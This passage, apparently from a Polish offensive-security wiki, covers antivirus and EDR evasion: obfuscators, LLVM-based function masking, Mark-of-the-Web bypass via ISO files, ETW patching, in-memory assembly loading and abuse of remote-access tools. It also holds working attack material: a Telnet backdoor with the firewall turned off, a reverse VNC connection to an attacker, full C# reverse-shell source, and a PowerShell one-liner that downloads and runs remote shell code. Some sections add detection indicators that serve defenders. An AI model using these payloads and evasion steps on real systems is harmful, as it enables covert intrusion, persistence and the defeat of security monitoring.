     • de4dot cofnie spłaszczanie przepływu sterowania, przywróci oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfruje ciągi stałych.

3.  Usuwanie proxy-call – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Po tym kroku powinny być widoczne standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`, zamiast nieprzejrzystych funkcji opakowujących (`Class8.smethod_10`, …).

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy i wyszukaj duże bloki Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *właściwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonywania **bez** uruchamiania złośliwego pliku próbki – jest to przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx tworzy atrybut niestandardowy o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznej wstępnej analizy próbek.

#### Jednolinijkowiec
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie open-source'owego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/), który zwiększa bezpieczeństwo oprogramowania za pomocą [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczeń przed modyfikacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak użyć języka `C++11/14`, aby generować obfuskowany kod podczas kompilacji, bez używania zewnętrznych narzędzi i modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji wygenerowanych przez framework metaprogramowania szablonów C++, co nieco utrudnia życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binarny x64, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorficznego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework do precyzyjnej obfuskacji kodu dla języków obsługiwanych przez LLVM, wykorzystujący ROP (programowanie zorientowane na powroty). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co niweczy nasze naturalne wyobrażenie o normalnym przepływie sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do postaci shellcode, a następnie je ładować

### Wspomagana przez kompilator LLVM, per-funkcyjna samomaskująca

Zamiast maskować cały implant tylko podczas uśpienia, zmodyfikowany backend LLVM X86 może utrzymywać wybrane funkcje w postaci zamaskowanej operacją XOR, gdy są nieaktywne. PoC Function Peekaboo wybiera nazwy po demanglingu zawierające `REG_`, wstrzykuje niezależne od położenia stuby wejścia/wyjścia wokół końcowego kodu maszynowego i emituje jeden wspólny handler maskujący w `.text`; sygnatury na poziomie źródła i konwencja wywołań Windows x64 pozostają bez zmian.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformacja przepływu sterowania w backendzie

Transformację należy przeprowadzić po wyborze instrukcji i optymalizacji, ponieważ musi ona uwzględniać **każdą wygenerowaną instrukcję powrotu** i znać dokładny układ x86. `MachineFunctionPass` wykonywany przed emisją znajduje ostatni `MachineInstr::isReturn()`, usuwa go, aby końcowa ścieżka przechodziła dalej do dołączonego epilogu, a wcześniejsze instrukcje powrotu zastępuje przez `JMP_1 handler`. Zachowaj wszelkie wygenerowane przez kompilator instrukcje zwalniania stosu/ramki poprzedzające każdy powrót; przekieruj wyłącznie samą instrukcję powrotu.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` i `emitFunctionBodyEnd()` emitują stuby poszczególnych funkcji, a `emitEndOfAsmFile()` emituje handler. Symbole współdzielone między etapami emisji pozwalają, by skok w prologu wskazywał na późniejszy epilog; przy ręcznej emisji bliskiego `je` zapisz `0F 84`, a następnie czterobajtowe wyrażenie MC `target - address_after_je`. Wywołania i skoki do handlera można natomiast emitować jako obiekty `MCInst` (`CALL64pcrel32` i `JMP_1`). Jeśli funkcja nie została wybrana i niczego nie zmieniono, pass musi zwrócić `false`; PoC nieprawidłowo zwraca w tej sytuacji `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadane i inicjalizacja przed CRT

PoC umieszcza klucz XOR i 16-bajtowe rekordy zawierające relokowany przez loader wskaźnik funkcji oraz długość ustalaną w czasie działania w `.funcmeta`. Chociaż pole C ma typ `uint32_t`, handler odczytuje QWORD z przesunięcia `+8` w rekordzie, obejmując długość i jej dopełnienie, a rekordy przesuwa o `0x10`. Nazwy sekcji PE mogą mieć tylko osiem bajtów, więc wyszukiwanie w czasie działania widzi `.funcmet`. Zewnętrzny patcher dodaje wykonywalną sekcję `.stub`, zapisuje w niej poprzednie RVA punktu wejścia i przekierowuje `AddressOfEntryPoint`; stub PIC pobiera bazę obrazu z `gs:[0x60]` → `[PEB+0x10]`, przegląda importy PE32+, aby znaleźć już zaimportowane `VirtualProtect`, i uruchamia się przed CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inicjalizacja ustawia znacznik w `gs:[0xE8]` i wywołuje każdą funkcję z metadanych. Jej stale czytelny prolog zapisuje początek funkcji w `gs:[0xF0]`, wykrywa znacznik i pomija wciąż odszyfrowane ciało. Epilog używa następnie `call handler`; po zapisaniu przez handler 13 rejestrów (`0x68` bajtów) adres powrotu pod `[rsp+0x68]` wskazuje koniec przekształconej funkcji, więc `end - start` można zapisać w jej rekordzie metadanych. Po zamaskowaniu wszystkich ciał stub usuwa znacznik i wykonuje skok do `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Podczas zwykłego wywołania prolog wywołuje ten sam symetryczny handler, aby odszyfrować ciało. Końcowa ścieżka przechodzi do dołączonego epilogu, a każdy wcześniejszy powrót skacze bezpośrednio do wspólnego handlera. Zwykły epilog również używa `jmp handler`, a nie `call`, więc po ponownym zamaskowaniu `ret` handlera pobiera adres powrotu pierwotnego wywołującego, zachowując wynik funkcji w `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Prymityw maskujący i wskaźniki analityczne

Handler znajduje bieżący rekord, pomija stały, widoczny prolog (`0x46` bajtów w tej kompilacji), ustawia pozostałą część na `PAGE_EXECUTE_READWRITE`, wykonuje XOR bajt po bajcie przy użyciu najmłodszego bajtu klucza, a następnie ustawia ochronę na `PAGE_EXECUTE_READ`. Ta sama pętla odszyfrowuje więc ciało przy wejściu i szyfruje je przy każdym zwykłym wyjściu.<sup>[[38]](#references)[[39]](#references)</sup>

Wskaźniki o wysokiej wartości diagnostycznej dla tego rozwiązania obejmują:<sup>[[38]](#references)[[39]](#references)</sup>

- punkt wejścia w wykonywalnej sekcji `.stub` oraz sekcję `.funcmet` zawierającą klucz i relokowane wskaźniki do `.text`;
- parsowanie PEB, tablicy importów i tablicy sekcji przed CRT, po którym następują wywołania przez każdy wskaźnik z metadanych;
- identyczne prologi PIC `call`/`pop` i wiele miejsc powrotu przekierowanych do jednego handlera;
- zapisy do `gs:[0xE8]`, `gs:[0xF0]` i `gs:[0xF8]`, po których następują powtarzające się zmiany ochrony przez `VirtualProtect` oraz bajtowe operacje XOR zapisujące do wykonywalnych stron obrazu.

To sposób na uniknięcie skanerów pamięci, a nie ochrona kryptograficzna: zmodyfikowany plik nadal zawiera oryginalne, odszyfrowane ciało, a debugger może zatrzymać się na `VirtualProtect` lub pętli XOR i zrzucić aktywną funkcję. Jednobajtowy XOR, czytelne metadane i stała granica `0x46` ułatwiają też odzyskanie kodu offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Pola TEB używane w PoC są lokalne dla wątku, ale zmodyfikowane strony kodu są współdzielone przez cały proces. Współbieżne lub rekurencyjne wejście może więc ponownie przełączyć instrukcje, gdy inne wywołanie jest w trakcie wykonywania; wyjątki i nielokalne wyjścia również mogą ominąć ponowne maskowanie. Solidna implementacja musi synchronizować zmiany, przywracać rzeczywistą ochronę zwróconą przez `lpflOldProtect`, unikać zakodowanych na stałe długości stubów, sprawdzić wyrównanie stosu x64 zarówno w ścieżkach `call`, jak i `jmp`, a także wywoływać `FlushInstructionCache` po modyfikacji wykonywalnych bajtów. Microsoft wyraźnie wskazuje, że za spójność pamięci podręcznej instrukcji po modyfikacji wykonywalnego kodu odpowiada wywołujący.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa, którego celem jest ochrona użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że aplikacje pobierane rzadko wywołają SmartScreen, który ostrzeże użytkownika końcowego i uniemożliwi mu uruchomienie pliku (można go jednak nadal uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegania otrzymaniu przez payloady Mark of The Web jest spakowanie ich w kontener, na przykład ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów, aby ominąć Mark-of-the-Web.

Przykładowe użycie:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Oto demo obejścia SmartScreen przez umieszczanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to zaawansowany mechanizm logowania w systemie Windows, który pozwala aplikacjom i komponentom systemu **rejestrować zdarzenia**. Może być jednak również wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączania (omijania) AMSI, można też sprawić, by funkcja **`EtwEventWrite`** procesu działającego w przestrzeni użytkownika natychmiast zwracała wynik bez rejestrowania żadnych zdarzeń. W tym celu modyfikuje się funkcję w pamięci, aby natychmiast zwracała wynik, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Refleksja nad assembly C#

Ładowanie plików binarnych C# do pamięci jest znane od dawna i nadal stanowi świetny sposób uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania na dysku, wystarczy nam martwić się o patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) umożliwia już bezpośrednie wykonywanie assembly C# w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu — zabiciu nowego procesu. Ta metoda ma zarówno zalety, jak i wady. Jej zaletą jest to, że wykonanie odbywa się **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas działań post-exploitation albo zostaną one wykryte, **znacznie wzrasta szansa**, że nasz **implant przetrwa**. Wadą jest **większe ryzyko** wykrycia przez **detekcje behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. Dzięki temu można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest **znacznie większa szansa** na **utratę Beacona**, jeśli podczas wykonywania payloadu coś pójdzie nie tak, bo może dojść do awarii procesu.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu assembly C#, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i zapoznaj się z ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować assembly C# **z PowerShell**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Przepakowywanie narzędzi .NET do WebAssembly za pomocą NativeAOT (WasmForge)

Standardowe techniki `execute-assembly` zachowują rozpoznawalny MSIL i ostatecznie inicjują CLR. **WasmForge** zmienia natomiast warstwę wykonawczą: migruje projekt C# do eksperymentalnego celu NativeAOT-LLVM WASI, kompiluje go z wyprzedzeniem do WebAssembly i osadza ten moduł w hoście Windows PE opartym na Wazero. Powstały proces nie potrzebuje CLR, JIT ani hosta `dotnet` systemu docelowego, więc reguły oparte wyłącznie na nazwach assembly zarządzanych, ładowaniu CLR, AMSI lub .NET ETW tracą bezpośredni wgląd. Jest to technika unikania wykrycia i pakowania, a nie obejście granicy uprawnień — kod gościa zachowuje uprawnienia oryginalnego narzędzia i jego obserwowalne zachowanie w systemie operacyjnym.<sup>[[44]](#references)[[45]](#references)</sup>

### Budowanie projektu C#

Zalecaną metodą budowania jest środowisko Docker projektu, ponieważ zawiera ono .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker i zależności do podpisywania. Plik `.csproj` jest wykrywany automatycznie; pojedyncze polecenie budowania wykonuje migrację, poprawki zgodności, kompilację WASM, tworzenie PE i podpisywanie.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

W przypadku rozwiązywania problemów lub przeglądania wygenerowanego kodu podziel proces na etapy: `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` oraz końcowe `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Obraz kompilacyjny używa też wrappera `wasm-component-ld`, aby uniknąć kodowania komponentów WASI Preview 2 i wygenerować zwykły moduł oczekiwany przez wbudowane środowisko uruchomieniowe.<sup>[[44]](#references)[[45]](#references)</sup>

### Łączenie wasm32 C# z x64 Win32

Nie jest to przezroczysta rekompilacja. NativeAOT-WASI nie obsługuje niektórych funkcji BCL związanych z Windows lub zmienia sposób ich działania, a gość wasm32 zwykle przydziela czterobajtowe sloty na wskaźniki, podczas gdy API x64 może zwracać wskaźniki ośmiobajtowe. WasmForge rozwiązuje oba problemy za pomocą następujących generowanych warstw:<sup>[[44]](#references)</sup>

1. Patcher kodu źródłowego naprawia różnice semantyczne specyficzne dla AOT i przekierowuje nieobsługiwane wywołania dotyczące rejestru, potoków, WMI, tożsamości, usług katalogowych, wersji plików, LSA i podobnych funkcji do helperów `Wf*`.
2. Skaner P/Invoke generuje mapowania NativeAOT `DirectPInvoke`, dzięki którym wywołania `[DllImport]` są wiązane z połączonymi symbolami mostka C zamiast dynamicznie ładować zadeklarowaną bibliotekę DLL wewnątrz gościa.
3. Wskaźniki przekazywane do hosta używają typu `ulong` w C# i `uint64_t` w C. Generyczny dispatcher przekazuje wywołanie do handlera Win32 hosta; `out8_mask` oznacza prawdziwe ośmiobajtowe sloty wyjściowe, których górne połówki należy zachować. W przypadku nieoznaczonych wyjść o strukturze wasm32 stosuje się ochronę przez zrzut i przywrócenie, aby zapis x64 nie uszkodził sąsiednich czterech bajtów.
4. Dedykowane mostki hosta obsługują operacje niepasujące do generycznego dispatchu syscalli, takie jak dostęp do pamięci podręcznej biletów LSA, operacje Kerberos/BCrypt ze strukturalnymi wynikami, ruch TCP KDC i zapytania LDAP.

Na przykład wrapper dla `version.dll!VerQueryValueW` przekazuje cztery adresy hosta i ustawia bity 2 i 3 (`0xC`), ponieważ wskaźnik wartości i długość zajmują ośmiobajtowe sloty wyjściowe. Sam wrapper pozostaje generyczny i przekazuje nazwę DLL, nazwę eksportu, argumenty oraz maskę do `wf_call_v2`; host wykonuje translację wskaźników i wywołuje natywne API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Ograniczenia i punkty zwrotne wykrywania

Kod intensywnie korzystający z refleksji, dynamiczne ładowanie zestawów, dowolne natywne funkcje zwrotne oraz złożone struktury x64 zwracane do pamięci WASM mogą nadal wymagać poprawek dla konkretnych narzędzi lub całkowicie zawodzić. Ogólne gniazda WASI Preview 2 mogą też trafiać do atrap no-op, dlatego obsługiwane narzędzia korzystają z host shims specyficznych dla danego protokołu. Weryfikuj każde polecenie względem natywnej kompilacji, zamiast zakładać równoważność funkcji.<sup>[[44]](#references)[[45]](#references)</sup>

Ta technika przesuwa telemetrię, zamiast czynić payload niewidocznym. Wykrywanie może skupić się na pliku PE zawierającym lub materializującym moduł WASM, zachowaniu środowiska uruchomieniowego podobnego do Wazero, nietypowym przydzielaniu i kopiowaniu pamięci hosta/gościa, ogólnym bezpośrednim wywoływaniu Win32, anomaliach związanych z podpisami i zasobami PE, a także wynikowych wywołaniach API i ruchu sieciowym. Braku zdarzeń CLR-load, AMSI lub .NET ETW nie należy zatem traktować jako dowodu, że proces jest nieszkodliwy.<sup>[[44]](#references)</sup>

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), można wykonywać złośliwy kod w innych językach, zapewniając zaatakowanej maszynie dostęp **do środowiska interpretera zainstalowanego w udziale SMB kontrolowanym przez atakującego**.

Zapewniając dostęp do plików binarnych interpretera i środowiska w udziale SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itd., zyskujemy **większą elastyczność w omijaniu sygnatur statycznych**. Testy losowych, nieobfuskowanych skryptów reverse shell w tych językach zakończyły się powodzeniem.

## Ponowne hostowanie WebAssembly w celu uniknięcia analizy statycznej

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuluje tokenem dostępu produktu zabezpieczającego, takiego jak EDR lub AV. Ograniczenie uprawnień tokena może pozwolić procesowi nadal działać, jednocześnie uniemożliwiając mu wykonywanie uprzywilejowanych działań inspekcyjnych lub naprawczych.

Aby temu zapobiec, Windows mógłby **uniemożliwić procesom zewnętrznym** uzyskiwanie uchwytów do tokenów procesów zabezpieczających.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Używanie zaufanego oprogramowania

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), wystarczy zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go, aby przejąć nad nim kontrolę i utrzymać trwałość:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj podane polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez używania GUI).
 

## Zaawansowane techniki unikania wykrycia

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Unikanie wykrycia to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach całkowite uniknięcie wykrycia jest praktycznie niemożliwe.

Każde środowisko, z którym się mierzysz, ma swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), które pozwoli poznać podstawy bardziej zaawansowanych technik unikania wykrycia.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To również świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) na temat wielowarstwowego unikania wykrycia.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który będzie **usuwać fragmenty pliku binarnego**, aż **ustali, którą jego część Defender** uznaje za złośliwą, i wyodrębni ją dla Ciebie.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia tę usługę w otwartym serwisie internetowym pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 włącznie każdy system Windows zawierał **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Skonfiguruj go tak, aby **uruchamiał się** przy starcie systemu, i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu** (stealth) i wyłącz zaporę:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki binarne do pobrania, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **komputer ofiary**

#### **Połączenie zwrotne**

**Atakujący** powinien **uruchomić na swoim** **hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do odebrania zwrotnego **połączenia VNC**. Następnie na **komputerze ofiary** uruchom demona winvnc poleceniem `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję, nie wolno robić kilku rzeczy:

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [wyskakujące okno](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo otworzy się [okno konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby uzyskać pomoc, bo wywołasz [wyskakujące okno](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload XML** przy użyciu:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# przy użyciu kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

